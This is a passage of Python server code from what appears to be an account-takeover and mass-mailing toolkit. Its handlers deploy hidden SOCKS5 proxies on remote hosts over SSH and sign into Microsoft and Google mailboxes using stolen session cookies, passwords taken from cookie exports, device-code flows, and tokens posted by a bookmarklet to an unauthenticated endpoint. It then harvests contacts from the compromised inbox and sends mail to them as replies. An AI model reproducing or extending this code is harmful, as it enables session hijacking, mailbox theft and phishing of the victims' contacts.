                ssh.connect(host, port=port, username=user, password=password, timeout=15)
                _, stdout, _ = ssh.exec_command("uname -s 2>/dev/null || echo WINDOWS")
                os_type = stdout.read().decode().strip()
                if "WINDOWS" in os_type.upper() or not os_type:
                    script = fr"""
powershell -Command "
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
New-Item -ItemType Directory -Force -Path C:\proxy | Out-Null;
$cfg = @'
nserver 8.8.8.8
nserver 1.1.1.1
nscache 65536
users {proxy_user}:CL:{proxy_pass}
auth strong
socks -p{socks_port} -i0.0.0.0
'@;
Set-Content -Path C:\proxy\3proxy.cfg -Value $cfg;
if (-not (Test-Path C:\proxy\3proxy.exe)) {{
  foreach ($u in @('https://github.com/z3APA3A/3proxy/releases/download/0.9.5/3proxy-0.9.5-x64.zip')) {{
    try {{ Invoke-WebRequest -Uri $u -OutFile C:\proxy\3proxy.zip -ErrorAction Stop; break }} catch {{ }}
  }};
  Expand-Archive -Path C:\proxy\3proxy.zip -DestinationPath C:\proxy\extract -Force;
  Get-ChildItem C:\proxy\extract -Recurse -Filter '3proxy.exe' | Select-Object -First 1 | Copy-Item -Destination C:\proxy\3proxy.exe -Force;
  Remove-Item C:\proxy\3proxy.zip -Force -ErrorAction SilentlyContinue;
}};
netsh advfirewall firewall delete rule name='SynthTel SOCKS5' 2>$null;
netsh advfirewall firewall add rule name='SynthTel SOCKS5' dir=in action=allow protocol=tcp localport={socks_port};
Stop-Process -Name 3proxy -Force -ErrorAction SilentlyContinue;
Start-Sleep -Seconds 1;
Start-Process -FilePath C:\proxy\3proxy.exe -ArgumentList 'C:\proxy\3proxy.cfg' -WindowStyle Hidden;
Start-Sleep -Seconds 2;
if (Get-Process -Name 3proxy -ErrorAction SilentlyContinue) {{ echo DEPLOY_OK }} else {{ echo DEPLOY_FAIL }};
"
"""
                    _, stdout, stderr = ssh.exec_command(script, timeout=60)
                    output = stdout.read().decode()
                    if "DEPLOY_OK" in output:
                        self._json(200, {"status": "ok", "message": "3proxy deployed (Windows)",
                                         "proxy": {"host": host, "port": str(socks_port),
                                                    "username": f"{proxy_user}-country-{country}-isp-{isp}",
                                                    "password": proxy_pass}})
                    else:
                        self._json(200, {"status": "error", "message": f"Windows deploy failed:\n{output[:400]}"})
                else:
                    script = f"""
set -e
if ! command -v 3proxy &>/dev/null; then
    if command -v apt-get &>/dev/null; then
        apt-get update -qq && apt-get install -y -qq 3proxy 2>/dev/null || (
            apt-get install -y -qq build-essential git 2>/dev/null
            cd /tmp && rm -rf 3proxy && git clone https://github.com/3proxy/3proxy.git 2>/dev/null
            cd 3proxy && make -f Makefile.Linux -j$(nproc) 2>/dev/null && cp bin/3proxy /usr/local/bin/3proxy
        )
    elif command -v yum &>/dev/null; then
        yum install -y gcc make git 2>/dev/null
        cd /tmp && rm -rf 3proxy && git clone https://github.com/3proxy/3proxy.git 2>/dev/null
        cd 3proxy && make -f Makefile.Linux -j$(nproc) 2>/dev/null && cp bin/3proxy /usr/local/bin/3proxy
    fi
fi
PROXY_BIN=$(which 3proxy 2>/dev/null || echo /usr/local/bin/3proxy)
mkdir -p /etc/3proxy
cat > /etc/3proxy/3proxy.cfg << 'PCFG'
nserver 8.8.8.8
nserver 1.1.1.1
nscache 65536
users {proxy_user}:CL:{proxy_pass}
auth strong
socks -p{socks_port} -i0.0.0.0
PCFG
cat > /etc/systemd/system/3proxy.service << 'SVC'
[Unit]
Description=3proxy SOCKS5
After=network.target
[Service]
Type=simple
ExecStart=PROXYBIN_PLACEHOLDER /etc/3proxy/3proxy.cfg
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target
SVC
sed -i "s|PROXYBIN_PLACEHOLDER|$PROXY_BIN|g" /etc/systemd/system/3proxy.service
command -v ufw &>/dev/null && ufw allow {socks_port}/tcp 2>/dev/null || true
command -v firewall-cmd &>/dev/null && firewall-cmd --permanent --add-port={socks_port}/tcp 2>/dev/null && firewall-cmd --reload 2>/dev/null || true
systemctl daemon-reload && systemctl enable 3proxy 2>/dev/null && systemctl restart 3proxy 2>/dev/null || $PROXY_BIN /etc/3proxy/3proxy.cfg &
sleep 1
ss -tlnp | grep -q ':{socks_port} ' && echo DEPLOY_OK || echo DEPLOY_FAIL
"""
                    _, stdout, stderr = ssh.exec_command(script, timeout=120)
                    output = stdout.read().decode()
                    if "DEPLOY_OK" in output:
                        self._json(200, {"status": "ok", "message": "3proxy deployed (Linux)",
                                         "proxy": {"host": host, "port": str(socks_port),
                                                    "username": f"{proxy_user}-country-{country}-isp-{isp}",
                                                    "password": proxy_pass}})
                    else:
                        self._json(200, {"status": "error", "message": f"Deploy failed:\n{output[:400]}"})
                ssh.close()
            except Exception as e:
                self._json(200, {"status": "error", "message": f"SSH failed: {e}"})

        # ── Validate sender email addresses (MX check) ───────
        elif p == "/api/validate-senders":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            addrs = data.get("addresses", [])
            if not addrs:
                self._json(200, {"results": []}); return
            try:
                from core.mx_sender import _resolve_mx_all_methods
                results = []
                cache   = {}
                for addr in addrs:
                    if not addr or "@" not in addr:
                        results.append({"email": addr, "valid": False, "mx": "", "error": "Invalid format"})
                        continue
                    domain = addr.split("@")[-1].lower()
                    if domain in cache:
                        c = cache[domain]
                        results.append({"email": addr, "valid": c["valid"], "mx": c["mx"], "error": c["error"]})
                        continue
                    try:
                        mx = _resolve_mx_all_methods(domain)
                        mx_host = mx[0][1] if mx else ""
                        cache[domain] = {"valid": bool(mx_host), "mx": mx_host, "error": ""}
                        results.append({"email": addr, "valid": bool(mx_host), "mx": mx_host, "error": ""})
                    except Exception as e:
                        cache[domain] = {"valid": False, "mx": "", "error": str(e)[:100]}
                        results.append({"email": addr, "valid": False, "mx": "", "error": str(e)[:100]})
                valid_count = sum(1 for r in results if r["valid"])
                self._json(200, {"results": results, "valid": valid_count, "total": len(results)})
            except Exception as e:
                self._json(200, {"error": str(e)[:300]})

        # ── Validate domains (DoH + fallback) ────────────────
        elif p == "/api/validate-domains":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            domains = data.get("domains", [])
            if not domains:
                self._json(200, {"results": []}); return
            try:
                from core.mx_sender import _resolve_mx_all_methods
                results = []
                for domain in domains:
                    domain = domain.strip().lower()
                    if not domain or "." not in domain:
                        results.append({"domain": domain, "valid": False, "mx": "", "method": "", "error": "Invalid domain"}); continue
                    mx_host = method = ""
                    # Cloudflare DoH
                    for doh_url, doh_label in [
                        (f"https://cloudflare-dns.com/dns-query?name={domain}&type=MX", "doh-cloudflare"),
                        (f"https://dns.google/resolve?name={domain}&type=MX",           "doh-google"),
                    ]:
                        try:
                            resp = urlopen(Request(doh_url, headers={"Accept": "application/dns-json"}), timeout=8)
                            d = json.loads(resp.read().decode())
                            if d.get("Status") == 0 and d.get("Answer"):
                                recs = []
                                for ans in d["Answer"]:
                                    if ans.get("type") == 15:
                                        parts = ans.get("data", "").split()
                                        if len(parts) >= 2:
                                            recs.append((int(parts[0]), parts[1].rstrip(".")))
                                if recs:
                                    mx_host = sorted(recs)[0][1]
                                    method  = doh_label
                                    break
                            elif d.get("Status") == 3:
                                results.append({"domain": domain, "valid": False, "mx": "", "method": doh_label, "error": "NXDOMAIN"})
                                mx_host = "NXDOMAIN"
                                break
                        except Exception:
                            pass
                    if mx_host == "NXDOMAIN":
                        continue
                    if not mx_host:
                        try:
                            mx = _resolve_mx_all_methods(domain)
                            if mx: mx_host, method = mx[0][1], "direct-dns"
                        except Exception:
                            pass
                    if mx_host:
                        results.append({"domain": domain, "valid": True, "mx": mx_host, "method": method, "error": ""})
                    else:
                        results.append({"domain": domain, "valid": False, "mx": "", "method": "all-failed", "error": f"No MX for {domain}"})
                valid_count = sum(1 for r in results if r["valid"])
                self._json(200, {"results": results, "valid": valid_count, "total": len(results)})
            except Exception as e:
                self._json(200, {"error": str(e)[:300]})

        # ── B2B: detect provider ─────────────────────────────
        elif p == "/api/b2b/detect":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            email = data.get("email", "").strip()
            if not email:
                self._json(400, {"error": "email required"}); return
            b2b  = _get_b2b(sess["user_id"])
            prov = b2b.detect(email)
            self._json(200, prov)

        # ── B2B: password login ──────────────────────────────
        elif p == "/api/b2b/auth/password":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b = _get_b2b(sess["user_id"])
            pinfo = data.get("providerInfo") or {}
            imap_host = data.get("imapHost") or pinfo.get("imap_host")
            imap_port = int(data.get("imapPort") or pinfo.get("imap_port") or 993)
            # Pass providerInfo into session so login_password skips re-detection
            if pinfo:
                b2b._s["provider"] = pinfo
            try:
                ok, err = b2b.login_password(
                    data.get("email", ""), data.get("password", ""),
                )
                if ok:
                    self._json(200, {"ok": True, "session": b2b.status()})
                else:
                    hint = ""
                    if err and "needs_app_pw" in str(err):
                        hint = "APP_PW_REQUIRED"
                    elif err and "mfa" in str(err).lower():
                        hint = "MFA_REQUIRED"
                    self._json(200, {"ok": False, "error": err or "Authentication failed", "hint": hint})
            except Exception as exc:
                self._json(200, {"ok": False, "error": f"Auth error: {exc}"})

        # ── B2B: token login ─────────────────────────────────
        elif p == "/api/b2b/auth/token":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b = _get_b2b(sess["user_id"])
            result = b2b.login_token(
                data.get("email", ""), data.get("token", ""),
                expires_in=int(data.get("expiresIn", 3600) or 3600),
            )
            self._json(200, result)

        # ── B2B: start device code flow ──────────────────────
        elif p == "/api/b2b/oauth-url":
            # Build the OAuth2 authorize URL
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            from b2b_manager import build_oauth_url
            # Use pre-configured creds if caller didn't supply them
            client_id     = data.get("client_id", "").strip() or _AZURE_CLIENT_ID
            client_secret = data.get("client_secret", "").strip() or _AZURE_CLIENT_SECRET
            redirect_uri  = data.get("redirect_uri", "").strip()
            tenant        = data.get("tenant", "common")  # common = multitenant + personal accounts
            if not client_id:
                self._json(400, {"error": "no_azure_app",
                                 "message": "No Azure App configured. Add client_id or set SYNTHTEL_AZURE_CLIENT_ID on the server."}); return
            host = self.headers.get("Host", "localhost")
            if not redirect_uri:
                # If using server-configured app, use localhost (registered in Azure portal)
                # Otherwise fall back to current host
                if not data.get("client_id", "").strip() and _AZURE_CLIENT_ID:
                    redirect_uri = "http://localhost/oauth-callback"
                else:
                    redirect_uri = f"http://{host}/oauth-callback"
            url = build_oauth_url(client_id, redirect_uri, tenant, state=str(sess["user_id"]))
            self._json(200, {"ok": True, "url": url, "redirect_uri": redirect_uri,
                             "has_server_app": bool(_AZURE_CLIENT_ID)})

        elif p == "/api/b2b/oauth-exchange":
            # Exchange auth code for token
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            from b2b_manager import exchange_oauth_code, login_token
            client_id     = data.get("client_id", "").strip() or _AZURE_CLIENT_ID
            client_secret = data.get("client_secret", "").strip() or _AZURE_CLIENT_SECRET
            redirect_uri  = data.get("redirect_uri", "").strip()
            code          = data.get("code", "").strip()
            email         = data.get("email", "").strip()
            tenant        = data.get("tenant", "organizations")
            # Match the redirect URI used in oauth-url
            if not redirect_uri:
                if not data.get("client_id", "").strip() and _AZURE_CLIENT_ID:
                    redirect_uri = "http://localhost/oauth-callback"
                else:
                    host = self.headers.get("Host", "localhost")
                    redirect_uri = f"http://{host}/oauth-callback"
            if not all([client_id, client_secret, code]):
                self._json(400, {"error": "client_id, client_secret, and code required"}); return
            result = exchange_oauth_code(client_id, client_secret, redirect_uri, code, tenant)
            if "access_token" in result:
                token = result["access_token"]
                b2b   = _get_b2b(sess["user_id"])
                auth  = login_token(email, token, b2b._s)
                if auth.get("ok"):
                    b2b._s["ms_refresh_token"] = result.get("refresh_token")
                    self._json(200, {**auth, "session": sess["token"]})
                else:
                    self._json(200, auth)
            else:
                self._json(200, {"ok": False, "error": result.get("error_description") or result.get("error", "Exchange failed")})

        elif p == "/api/b2b/token-receive":
            # No auth required — bookmarklet posts from outlook.office365.com
            try:
                data = self._read_body()
                tok  = (data.get("token") or "").strip()
                if tok.lower().startswith("bearer "): tok = tok[7:].strip()
                if not tok or len(tok) < 100:
                    self._json(400, {"error": "No valid token"}); return
                email_key = data.get("email", "unknown")
                _PENDING_TOKENS[email_key] = {"token": tok, "ts": time.time()}
                self._json(200, {"ok": True})
            except Exception as e:
                self._json(200, {"ok": False, "error": str(e)})

        elif p.startswith("/api/b2b/token-poll"):
            if not (sess := self._auth()): return
            from urllib.parse import parse_qs, urlparse
            qs = parse_qs(urlparse(self.path).query)
            email_key = qs.get("email", ["unknown"])[0]
            # Check any key that matches
            found = None
            for k, v in list(_PENDING_TOKENS.items()):
                if time.time() - v["ts"] < 300:  # 5 min TTL
                    if email_key in k or k in email_key or k == "unknown":
                        found = v["token"]
                        del _PENDING_TOKENS[k]
                        break
            if found:
                self._json(200, {"token": found})
            else:
                self._json(200, {"token": None})

        elif p == "/api/b2b/install-msal":
            if not (sess := self._auth()): return
            import subprocess
            try:
                result = subprocess.run(
                    ["pip", "install", "msal", "requests", "--break-system-packages", "-q"],
                    capture_output=True, text=True, timeout=60
                )
                if result.returncode == 0:
                    # Re-import msal now that it's installed
                    try:
                        import msal as _msal_new
                        import importlib, sys
                        import b2b_manager as _b2b_mod
                        _b2b_mod._msal = _msal_new
                        _b2b_mod._HAS_MSAL = True
                        self._json(200, {"ok": True, "message": "MSAL installed successfully — Device Code is ready!"})
                    except Exception as e:
                        self._json(200, {"ok": True, "message": "MSAL installed — please refresh the page and try Device Code again.", "restart_needed": True})
                else:
                    self._json(200, {"ok": False, "error": result.stderr[:300] or "pip install failed"})
            except Exception as e:
                self._json(200, {"ok": False, "error": str(e)})

        elif p == "/api/b2b/device-poll":
            if not (sess := self._auth()): return
            try:
                b2b    = _get_b2b(sess["user_id"])
                result = b2b.poll_device_code()
                if result.get("ok") and result.get("token"):
                    self._json(200, {"ok": True, "session": self._token()})
                else:
                    self._json(200, result)
            except Exception as e:
                import logging as _logging
                _logging.getLogger(__name__).exception("[B2B] device-poll crashed")
                self._json(200, {"ok": False, "error": str(e)})

        elif p == "/api/b2b/device-start":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b    = _get_b2b(sess["user_id"])
            result = b2b.start_device_code(
                data.get("email", ""),
                custom_client_id = data.get("client_id", "").strip(),
                custom_tenant    = data.get("tenant_id", "").strip(),
            )
            if result is None:
                from b2b_manager import _MSAL_ERR
                self._json(200, {"error": "msal_not_installed",
                                 "message": f"MSAL unavailable: {_MSAL_ERR or 'unknown error'}. Clicking Install will fix this."})
            else:
                self._json(200, {
                    "user_code":        result.get("code") or result.get("user_code"),
                    "verification_uri": "https://microsoft.com/devicelogin",
                    "app":              result.get("app", ""),
                    "expires_in":       result.get("expires_in", 900),
                })

        elif p == "/api/b2b/auth/cookie":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b       = _get_b2b(sess["user_id"])
            email_arg = data.get("email", "")
            raw_input = (data.get("cookies", "") or "").strip()

            dbg("COOKIE", f"Input len={len(raw_input)}", raw_input[:120])

            # ── Non-cookie keys to strip from any export format ──────────
            _STRIP = {
                "sessionid","useragent","user_agent","remoteaddr","remote_addr",
                "createtime","updatetime","createdat","updatedat",
                "username","password","origin","referer","host","url","title",
                "httponly","secure","samesite","path","domain","expires",
                "maxage","size","priority","sourcescheme","sourceport",
                "partitionkey","storeid","id","bodytokens","httptokens",
                "storeId","sameSite","httpOnly","maxAge","sourceScheme",
                "sourcePort","partitionKey","expirationdate","session",
            }
            cookie_pairs = {}   # name → value (real cookies only)
            cred_user    = ""
            cred_pass    = ""

            def _add(name, value):
                nonlocal cred_user, cred_pass
                n, v = str(name).strip(), str(value).strip()
                if not n or not v: return
                lk = n.lower()
                if lk in ("username", "email", "login"): cred_user = v
                elif lk == "password": cred_pass = v
                elif lk not in _STRIP: cookie_pairs[n] = v

            try:
                parsed = json.loads(raw_input)
            except Exception:
                parsed = None

            if isinstance(parsed, dict):
                dbg("COOKIE", "JSON dict, keys=" + str(list(parsed.keys())[:8]))

                # ── Format A: domain-keyed tokens ────────────────────────
                # {"tokens": {".login.microsoftonline.com": {"ESTSAUTH": {"Name":..,"Value":..}}}}
                if "tokens" in parsed and isinstance(parsed.get("tokens"), dict):
                    dbg("COOKIE", "Format=domain-keyed-tokens, domains=" + str(list(parsed["tokens"].keys())))
                    for _dom, _dc in parsed["tokens"].items():
                        if not isinstance(_dc, dict): continue
                        for _cn, _co in _dc.items():
                            if isinstance(_co, dict):
                                _add(_co.get("Name") or _co.get("name") or _cn,
                                     _co.get("Value") or _co.get("value") or "")
                            elif isinstance(_co, str):
                                _add(_cn, _co)
                    # top-level meta fields (sessionId, userAgent etc) go through _add → stripped
                    for k, v in parsed.items():
                        if k != "tokens" and isinstance(v, (str, int, float)):
                            _add(k, str(v))

                # ── Format B: HAR ─────────────────────────────────────────
                elif "log" in parsed and isinstance(parsed.get("log"), dict):
                    dbg("COOKIE", "Format=HAR")
                    for _e in parsed["log"].get("entries", []):
                        for _c in _e.get("request", {}).get("cookies", []):
                            if isinstance(_c, dict):
                                _add(_c.get("name",""), _c.get("value",""))

                # ── Format C: {"cookies": [{name,value},...]} ─────────────
                elif "cookies" in parsed and isinstance(parsed.get("cookies"), list):
                    dbg("COOKIE", "Format=cookies-wrapper")
                    for _c in parsed["cookies"]:
                        if isinstance(_c, dict):
                            _add(_c.get("name") or _c.get("Name",""),
                                 _c.get("value") or _c.get("Value",""))
                    for k, v in parsed.items():
                        if k != "cookies" and isinstance(v, (str, int, float)):
                            _add(k, str(v))

                # ── Format D: flat dict ───────────────────────────────────
                # {"ESTSAUTH": "value"} or {"ESTSAUTH": {"Name":..,"Value":..}}
                else:
                    dbg("COOKIE", "Format=flat-dict")
                    for k, v in parsed.items():
                        if isinstance(v, str): _add(k, v)
                        elif isinstance(v, dict):
                            _add(k, v.get("Value") or v.get("value") or "")
                        elif isinstance(v, (int, float)): _add(k, str(v))

            elif isinstance(parsed, list):
                # ── Format E: Cookie Editor [{name,value,...}] ────────────
                dbg("COOKIE", f"Format=JSON-array, items={len(parsed)}")
                for _item in parsed:
                    if not isinstance(_item, dict): continue
                    if "name" in _item or "Name" in _item:
                        _add(_item.get("name") or _item.get("Name",""),
                             _item.get("value") or _item.get("Value",""))
                    else:
                        for k, v in _item.items():
                            if isinstance(v, str): _add(k, v)

            # ── Pre-detect JS script (must happen before Format F) ───────────
            import re as _re
            _is_js_script = (
                "document.cookie" in raw_input or
                ("function" in raw_input[:80]) or
                raw_input.strip().startswith("!")
            )

            # ── Format F: raw "name=value; name2=value2" ──────────────────
            if not cookie_pairs and parsed is None and not _is_js_script:
                dbg("COOKIE", "Format=raw-header")
                for _part in raw_input.replace("\n", ";").split(";"):
                    _part = _part.strip()
                    if "=" in _part and len(_part) < 4096:
                        _k, _, _v = _part.partition("=")
                        _add(_k.strip(), _v.strip())

            # ── Format G: Netscape cookie file ────────────────────────────
            if not cookie_pairs and "Netscape" in raw_input:
                dbg("COOKIE", "Format=Netscape")
                for _line in raw_input.splitlines():
                    _line = _line.strip()
                    if not _line or _line.startswith("#"): continue
                    _parts = _line.split("\t")
                    if len(_parts) >= 7: _add(_parts[5], _parts[6])

            # ── Format H: JavaScript cookie-injector script ───────────────
            if not cookie_pairs and _is_js_script:
                dbg("COOKIE", "Format=JS-cookie-script")

                # Strategy 0: JSON.parse(`[...]`) format
                _jp_m = _re.search(r'JSON\.parse\(`(.*?)`\)', raw_input, _re.DOTALL)
                if _jp_m:
                    try:
                        _items = json.loads(_jp_m.group(1))
                        for _item in _items:
                            if isinstance(_item, dict):
                                _n = str(_item.get("name") or _item.get("Name") or "")
                                _v = str(_item.get("value") or _item.get("Value") or "")
                                if _n and _v: _add(_n, _v)
                        dbg("COOKIE", f"JS JSON.parse-extract OK: {len(cookie_pairs)} cookies", list(cookie_pairs.keys()))
                    except Exception as _je:
                        dbg("COOKIE", f"JS JSON.parse failed: {_je}")

                # Strategy 1: bracket-counting array extractor (let e=[...])
                _arr_str = None
                _am = _re.search(r'let\s+\w+\s*=\s*\[', raw_input)
                if _am:
                    _start = _am.end() - 1
                    _depth, _in_str, _i = 0, None, _start
                    while _i < len(raw_input):
                        _c = raw_input[_i]
                        if _in_str:
                            if _c == '\\': _i += 2; continue
                            if _c == _in_str: _in_str = None
                        else:
                            if _c in ('"', "'", '`'): _in_str = _c
                            elif _c == '[': _depth += 1
                            elif _c == ']':
                                _depth -= 1
                                if _depth == 0:
                                    _arr_str = raw_input[_start:_i+1]
                                    break
                        _i += 1
                    dbg("COOKIE", f"Bracket extractor: arr_str={'found' if _arr_str else 'NOT FOUND'}, start={_am.start() if _am else None}")

                if _arr_str:
                    try:
                        # Only quote UNQUOTED keys — negative lookahead skips already-quoted keys
                        _norm = _re.sub(r'([{,])\s*(?!")([a-zA-Z_]\w*)\s*:', r'\1"\2":', _arr_str)
                        _norm = _norm.replace("!0", "true").replace("!1", "false")
                        _items = json.loads(_norm)
                        for _item in _items:
                            if isinstance(_item, dict):
                                _n = str(_item.get("name") or _item.get("Name") or "")
                                _v = str(_item.get("value") or _item.get("Value") or "")
                                if _n and _v: _add(_n, _v)
                        dbg("COOKIE", f"JS bracket-extract OK: {len(cookie_pairs)} cookies", list(cookie_pairs.keys()))
                    except Exception as _je:
                        dbg("COOKIE", f"JS JSON parse failed: {_je} | arr_str[:120]={_arr_str[:120]}")

                # Strategy 2: pull name and value independently per object block
                # Handles {..."name":"X"..."value":"Y"...} where they're not adjacent
                if not cookie_pairs:
                    for _obj in _re.finditer(r'\{[^{}]{10,}\}', raw_input):
                        _blob = _obj.group(0)
                        _nm = _re.search(r'"name"\s*:\s*"([^"]{1,80})"', _blob)
                        _vl = _re.search(r'"value"\s*:\s*"([^"]{0,4000})"', _blob)
                        if _nm and _vl:
                            _add(_nm.group(1), _vl.group(1))
                    dbg("COOKIE", f"Strategy2 name/value: {len(cookie_pairs)} cookies")

                # Strategy 3: document.cookie = `template` — extract per-assignment
                if not cookie_pairs:
                    for _m in _re.finditer(r'document\.cookie\s*=\s*`([^`]+)`', raw_input):
                        _seg = _m.group(1)
                        # Template: ${o.name}=${o.value};Max-Age=...
                        # Extract just the ${...}=${...} part
                        _tv = _re.match(r'\$\{[^}]+\}\s*=\s*\$\{[^}]+\}', _seg)
                        if not _tv:
                            # Literal name=value before first ;
                            _plain = _seg.split(";")[0].strip()
                            if "=" in _plain and "${" not in _plain:
                                _ck, _, _cv = _plain.partition("=")
                                _add(_ck.strip(), _cv.strip())

            # ── Sanity check: discard keys that look like code fragments ──
            # If the "cookie names" contain spaces, {, }, (, ), let, function etc
            # the user pasted code or the wrong thing entirely
            _CODE_SIGNS = {"function", "document", "let ", "var ", "const ", "for(", "for (", "${", "=>"}
            _junk_keys = [k for k in list(cookie_pairs.keys())
                          if any(s in k for s in _CODE_SIGNS) or " " in k.strip()
                          or len(k) > 80]
            for _jk in _junk_keys:
                dbg("COOKIE", f"Dropping junk key: {_jk[:60]}")
                del cookie_pairs[_jk]

            dbg("COOKIE", f"Extracted {len(cookie_pairs)} cookies",
                list(cookie_pairs.keys()))

            # If we still have nothing useful, return a clear actionable error
            # instead of passing garbage to b2b_manager
            if not cookie_pairs and not cred_pass:
                _hint = ""
                if "document.cookie" in raw_input or "function" in raw_input[:100]:
                    _hint = ("Looks like you pasted a JavaScript injector script. "
                             "Export as JSON instead: in Cookie Editor click Export → JSON (not 'Export as JS'). "
                             "Or use the raw cookie header from DevTools → Network tab → request headers → 'cookie:'")
                else:
                    _hint = ("Could not extract any cookies from the pasted data. "
                             "Use Cookie Editor → Export → copy the JSON array, "
                             "or copy the 'cookie:' header value from browser DevTools Network tab.")
                dbg("COOKIE", "No cookies extracted — returning format error")
                self._json(200, {"ok": False, "error": _hint})
                return

            # Pass clean "name=value; ..." string to b2b_manager
            clean = "; ".join(f"{n}={v}" for n, v in cookie_pairs.items()) or raw_input

            try:
                result = b2b.login_cookie(cred_user or email_arg, clean)
                dbg("COOKIE", f"login_cookie ok={result.get('ok')}", result.get("error") or result.get("method",""))
            except AttributeError:
                result = {"ok": False, "error": "b2b_manager outdated — restart server after deploying b2b_manager.py"}
                dbg("COOKIE", "AttributeError: b2b_manager missing login_cookie")
            except Exception as e:
                result = {"ok": False, "error": str(e)[:300]}
                dbg("COOKIE", "Exception in login_cookie", str(e)[:200])

            # Credential fallback — if username+password found in export
            if not result.get("ok") and cred_pass:
                dbg("COOKIE", "Trying password fallback", cred_user or email_arg)
                try:
                    ok2, err2 = b2b.login_password(cred_user or email_arg, cred_pass)
                    if ok2:
                        result = {"ok": True, "method": "password_from_export",
                                  "note": "Used username+password found in the export"}
                        dbg("COOKIE", "Password fallback succeeded")
                    else:
                        result["error"] = (result.get("error","") + f" | Password fallback: {err2}")
                        dbg("COOKIE", "Password fallback failed", err2)
                except Exception as pe:
                    dbg("COOKIE", "Password fallback exception", str(pe))

            self._json(200, result)

        elif p == "/api/b2b/auth/otp":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b    = _get_b2b(sess["user_id"])
            result = b2b.login_password_otp(data.get("email", ""), data.get("password", ""), data.get("otp", ""))
            self._json(200, result)

        elif p == "/api/b2b/google-device-start":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b    = _get_b2b(sess["user_id"])
            result = b2b.start_google_device_code(data.get("email", ""))
            self._json(200, result or {"error": "Failed to start Google device flow"})

        elif p == "/api/b2b/google-device-poll":
            if not (sess := self._auth()): return
            b2b    = _get_b2b(sess["user_id"])
            result = b2b.poll_google_device_poll()
            self._json(200, result)

        # ── B2B: extract from inbox (streaming) ─────────────
        elif p == "/api/b2b/extract":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b = _get_b2b(sess["user_id"])
            self._stream_start()
            try:
                days_back    = int(data.get("daysBack", 90) or 90)
                limit        = int(data.get("limit", 2000) or 2000)
                filt_generic = data.get("filterGeneric", True)
                folders      = data.get("folders")
                domain_allow = data.get("domainAllow", [])
                domain_block = data.get("domainBlock", [])
                subj_filter  = data.get("subjectFilter", [])
                import datetime as _dt2
                date_after = (_dt2.datetime.utcnow() - _dt2.timedelta(days=days_back)).strftime("%Y-%m-%dT00:00:00Z")
                # Try new signature first, fall back to old
                try:
                    gen = b2b.extract(
                        folders       = folders,
                        filter_generic= filt_generic,
                        days_back     = days_back,
                        domain_allow  = domain_allow,
                        domain_block  = domain_block,
                        subject_filter= subj_filter,
                        limit         = limit,
                    )
                except TypeError:
                    gen = b2b.extract(
                        folders       = folders,
                        filter_generic= filt_generic,
                        date_after    = date_after,
                        limit         = limit,
                    )
                for event in gen:
                    try:
                        self._stream_chunk(event)
                    except (BrokenPipeError, ConnectionResetError):
                        return
            except Exception as e:
                try:
                    self._stream_chunk({"type": "error", "msg": str(e)[:300]})
                except Exception:
                    pass
            self._stream_end()

        # ── Standalone IMAP inbox extractor ─────────────────
        elif p == "/api/extract-inbox":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            try:
                from core.imap_extractor import extract_from_inbox
                result = extract_from_inbox(
                    email       = data.get("email", ""),
                    password    = data.get("password", ""),
                    access_token= data.get("accessToken", ""),
                    imap_host   = data.get("imapHost"),
                    imap_port   = int(data.get("imapPort", 993) or 993),
                    limit       = int(data.get("limit", 500) or 500),
                    filter_generic = data.get("filterGeneric", True),
                )
                self._json(200, result)
            except ImportError:
                self._json(500, {"error": "imap_extractor module not available"})
            except Exception as e:
                self._json(200, {"error": str(e)[:300]})

        # ── B2B: sanitize extracted leads ────────────────────
        elif p == "/api/b2b/sanitize":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b = _get_b2b(sess["user_id"])
            try:
                leads = b2b.sanitize(
                    filter_generic  = data.get("filterGeneric", True),
                    dedup_domain    = data.get("dedupDomain", False),
                    score_threshold = int(data.get("scoreThreshold", 0) or 0),
                )
                self._json(200, {"leads": [l.__dict__ for l in leads], "total": len(leads)})
            except Exception as e:
                self._json(200, {"error": str(e)[:300]})

        # ── B2B: send to extracted leads (streaming) ─────────
        elif p == "/api/b2b/send":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            b2b = _get_b2b(sess["user_id"])
            leads_raw = data.get("leads", [])
            self._stream_start()
            try:
                # Leads may come from frontend as dicts — re-wrap them
                leads = []
                for l in leads_raw:
                    if isinstance(l, dict):
                        bl = B2BLead.__new__(B2BLead)
                        bl.__dict__.update(l)
                        leads.append(bl)
                for event in b2b.send(
                    leads      = leads or b2b._leads,
                    html       = data.get("html", ""),
                    subject    = data.get("subject", ""),
                    plain      = data.get("plain", ""),
                    mode       = data.get("mode", "reply"),
                    from_name  = data.get("fromName", ""),
                    from_email = data.get("fromEmail", ""),
                    attachments= data.get("attachments", {}),
